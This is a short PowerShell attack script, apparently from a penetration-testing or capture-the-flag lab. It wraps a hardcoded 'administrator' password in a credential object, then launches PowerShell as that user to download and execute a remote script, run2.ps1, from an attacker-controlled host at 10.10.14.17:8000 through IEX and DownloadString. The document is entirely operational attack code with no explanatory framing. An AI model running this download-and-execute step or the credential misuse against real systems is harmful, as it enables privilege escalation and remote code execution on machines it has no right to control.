$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator', $passwd)

$runthis = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/run2.ps1')"

Start-Process -FilePath "powershell" -argumentlist $runthis -Credential $creds -WorkingDirectory 'C:\Windows\system32'
